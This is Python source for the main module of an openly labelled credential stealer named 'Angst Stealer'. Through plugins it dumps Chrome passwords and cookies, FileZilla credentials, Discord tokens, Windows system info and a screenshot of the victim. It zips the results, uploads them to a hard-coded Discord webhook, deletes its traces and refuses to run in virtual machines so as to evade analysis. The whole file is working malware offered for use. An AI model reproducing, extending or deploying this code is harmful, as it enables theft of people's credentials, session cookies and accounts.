"""
Author: github.com/backslash
Description: Pure python implementation of a proper stealer
DEPENDENCIES:
    - requests
    - cryptodome
    - mss
    - pywin32
"""
import os
import zipfile

import mss.tools
import requests

from plugins.antivm import AntiVM
from plugins.chrome import Chrome
from plugins.chromecookies import Cookies
from plugins.discord import Discord
from plugins.filezilla import Filezilla
from plugins.screenshot import Screenshot
from plugins.windows import Windows

"""
webhook - The discord webhook for sending logs
chrome - Should it dump chrome credentials
filezilla - Should it dump filezilla logs
discord - Dump discord tokens
screenshot - Take screenshot of victim
windows - give windows info
"""
CONFIG = {
    "webhook" : "https://discord.com/api/webhooks/775780990407802911/p5m1xl5dWFOT6JedpG_kzzc7mTb_o9R1i_A1Wjv4RD-TLGtOA-w8a-cEIckhlogOyIkH",
    "software": {
        "chrome" : True,
        "chromecookies": True,
        "filezilla": True,
        "discord": True,
        "screenshot": True,
        "windows": True
    }
}


class Angst():
    def __init__(self):
        self.plugins = {
            "chrome": Chrome(),
            "chromecookies": Cookies(),
            "filezilla": Filezilla(),
            "discord": Discord(),
            "screenshot": Screenshot(),
            "windows": Windows()
        }
        self.app_data = os.getenv("LOCALAPPDATA")

    def run(self):
        """
        Runs angst and checks and
        dumps accordingly
        to the config which is
        given by the user.
        """
        try: #temp patch since I am lazy
            angst_dir = os.path.join(self.app_data, "Angst")
            os.mkdir(angst_dir)
            os.mkdir(f"{angst_dir}\\passwords")
            os.mkdir(f"{angst_dir}\\cookies")
        except:
            pass
        for plugin in self.plugins:
            try:
                for conf in CONFIG["software"]:
                    if conf == plugin and CONFIG["software"][conf] == True:
                        if conf != "screenshot" and conf != "chromecookies" and conf != "windows":
                            dump_data = self.plugins[conf].dump()
                            if dump_data != "":
                                dump_file = f"{angst_dir}\\passwords\\{conf}.txt"
                                with open(dump_file, "w+") as dumped_file:
                                    dumped_file.write(dump_data)
                        elif conf == "chromecookies":
                            dump_file = f"{angst_dir}\\cookies\\{conf}.txt"
                            with open(dump_file, "w+") as dumped_file:
                                dumped_file.write(self.plugins[conf].dump())
                        elif conf == "windows":
                            dump_file = f"{angst_dir}\\{conf}.txt"
                            with open(dump_file, "w+") as dumped_file:
                                dumped_file.write(self.plugins[conf].dump())
                        else:
                            mss.tools.to_png(self.plugins[conf].dump().rgb,
                                             self.plugins[conf].dump().size,
                                             output=f"{angst_dir}\\screenshot.png")
            except:
                pass



    def zip(self, src, dst):
        """
        Zips our folder with all the contents
        preserves part of the folder tree.
        """
        zipped_file = zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED)
        abs_src = os.path.abspath(src)
        for dirname, _, files in os.walk(src):
            for filename in files:
                absname = os.path.abspath(os.path.join(dirname, filename))
                arcname = absname[len(abs_src) + 1:]
                zipped_file.write(absname, arcname)
        zipped_file.close()

    def send(self):
        """
        Sends the sensitive information
        through the webhook
        """
        temp = os.path.join(self.app_data, "Angst")
        new = os.path.join(self.app_data, f'Angst-[{os.getlogin()}].zip')
        self.zip(temp, new)
        alert = {
            "avatar_url":"https://i.imgur.com/tkQZZL2.png",
            "name":"Angst Stealer",
            "embeds": [
                {
                    "title": "Angst Stealer",
                     "description": "Angst has successfully found an new user.",
                    "color": 15146294,

                    "thumbnail": {
                        "url": "https://i.imgur.com/tkQZZL2.png"
                    }
                }
            ]
        }
        requests.post(CONFIG["webhook"],json=alert)
        requests.post(CONFIG["webhook"], files={'upload_file': open(new,'rb')})

    def cleanup(self):
        """
        Removes all trace
        of angst by deleting
        log files left by
        angst.
        """
        angst_dir = os.path.join(self.app_data, "Angst")
        for subdir, dirs, files in os.walk(angst_dir):
            for file in files:
                filepath = f"{subdir}{os.sep}{file}"
                os.remove(filepath)

        for subdir, dirs, files in os.walk(angst_dir):
            for directory in dirs:
                os.rmdir(f"{subdir}\\{directory}")
        os.rmdir(angst_dir)
        os.remove(os.path.join(self.app_data, f'Angst-[{os.getlogin()}].zip'))

if __name__ == "__main__":
    if AntiVM().inVM() == False:
        a = Angst()
        a.run()
        a.send()
        a.cleanup()
